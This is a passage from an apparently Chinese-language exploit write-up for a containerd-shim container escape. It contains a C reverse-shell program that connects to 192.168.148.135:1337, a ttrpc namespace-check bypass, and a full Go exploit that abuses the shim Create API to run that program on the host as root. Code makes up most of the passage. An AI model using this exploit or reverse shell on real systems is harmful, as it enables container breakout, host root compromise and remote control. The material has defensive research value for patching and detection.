    2:freezer:/docker/59ff2a350d6128188306ed648372570989866a75a4c1c56afd6f675a39d28f77
    1:name=systemd:/docker/59ff2a350d6128188306ed648372570989866a75a4c1c56afd6f675a39d28f77
    0::/system.slice/containerd.service
利用过程如下：
（1）编写nc代码并编译，放在docker的根目录下：
    #include 
    #include 
    int main()
    {
            system("/bin/sh -i >& /dev/tcp/192.168.148.135/1337 0>&1");
            return 0;
    }
（2）在docker 里面获取容器的存储目录，docker的根目录对应host上的路径为：
    /var/lib/docker/overlay2/48f9caf0a731807f71c7277e8dfaeef58adb7c8f9b6180facdb3868bf1944a92/merged
（3）利用shim的Create api
来调用（2）路径中存放的nc程序，就会执行nc连接到另一台机器192.168.148.135，反弹shell，得到host的root权限，完成虚拟机逃逸。
效果如下：
**docker：**
**host：**
**另一台机器192.168.148.135：**
**需要注意的是** ：执行binary:///bin/sh?-c= 这样的IO进程，要求ttrpc 连接必须要有一个containerd
命名空间，可以通过以下代码绕过该检查：
    md := ttrpc.MD{} 
    md.Set("containerd-namespace-ttrpc", "notmoby")
    ctx = ttrpc.WithMetadata(ctx, md)
漏洞利用代码：
    package main
    import (
        "context"
        "errors"
        "io/ioutil"
        "log"
        "net"
        "regexp"
        "strings"
        "github.com/containerd/ttrpc"
        shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
    )
    func getDockerID() (string,  error) {
        re, err := regexp.Compile("pids:/docker/.*")
        if err != nil {
            return "", err
        }
        data, err := ioutil.ReadFile("/proc/self/cgroup")
        matches := re.FindAll(data, -1)
        if matches == nil {
            return "", errors.New("Cannot find docker id")
        }
        tmp_docker_id := matches[0]
        docker_id := string(tmp_docker_id[13 : len(tmp_docker_id)])
        return docker_id, nil
    }
    func getMergedPath() (string,  error) {
        re, err := regexp.Compile("workdir=.*")
        if err != nil {
            return "", err
        }
        data, err := ioutil.ReadFile("/etc/mtab")
        matches := re.FindAll(data, -1)
        if matches == nil {
            return "", errors.New("Cannot find merged path")
        }
        tmp_path := matches[0]
        path := string(tmp_path[8 : len(tmp_path)-8])
        merged := path + "merged/"
        return merged, nil
    }
    func getShimSockets() ([][]byte, error) {
        re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
        if err != nil {
            return nil, err
        }
        data, err := ioutil.ReadFile("/proc/net/unix")
        matches := re.FindAll(data, -1)
        if matches == nil {
            return nil, errors.New("Cannot find vulnerable socket")
        }
        return matches, nil
    }
    func exp(sock string, docker_id string, payload_path string) bool {
        sock = strings.Replace(sock, "@", "", -1)
        conn, err := net.Dial("unix", "\x00"+sock)
        if err != nil {
            log.Println(err)
            return false
        }
        client := ttrpc.NewClient(conn)
        shimClient := shimapi.NewShimClient(client)
        ctx := context.Background()
        md := ttrpc.MD{} 
        md.Set("containerd-namespace-ttrpc", "notmoby")
        ctx = ttrpc.WithMetadata(ctx, md)
        /* // poc get shim pid
        info, err := shimClient.ShimInfo(ctx, &types.Empty{})
        if err != nil {
            log.Println("rpc error:", err)
            return false
        }
        log.Println("shim pid:", info.ShimPid)
        */
        r, err := shimClient.Create(ctx, &shimapi.CreateTaskRequest{
            ID: docker_id,
            Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
            Runtime : "io.containerd.runtime.v1.linux",
            Stdin:  "anything",
            //Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/foobar",
            Stdout: "binary:///bin/sh?-c="+payload_path+"nc",
            Stderr: "anything",
            Terminal : false,
            Checkpoint : "anything",
        })
        if err != nil {
                log.Println(err)
                return false
        }
        log.Println(r)
        return true
    }
    func main() {
        matchset := make(map[string]bool)
        socks, err := getShimSockets()
        docker_id, err := getDockerID()
        log.Println("find docker id:", docker_id)
        merged_path, err := getMergedPath()
        log.Println("find path:", merged_path)
        if err != nil {
            log.Fatalln(err)
        }
        for _, b := range socks {
            sockname := string(b)
            if _, ok := matchset[sockname]; ok {
                continue
            }
            log.Println("try socket:", sockname)
            matchset[sockname] = true
            if exp(sockname, docker_id, merged_path) {
                break
            }
        }
        return
    }
## 参考链接
Poc :
安装特定版本的docker：
[https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf](https://github.com/crosbymichael/dockercon-2016/blob/master/Creating
Containerd.pdf)
[https://www.youtube.com/watch?v=xVVRA9rivB4&feature=youtu.be](https://www.youtube.com/watch?v=xVVRA9rivB4&feature=youtu.be)
利用分析：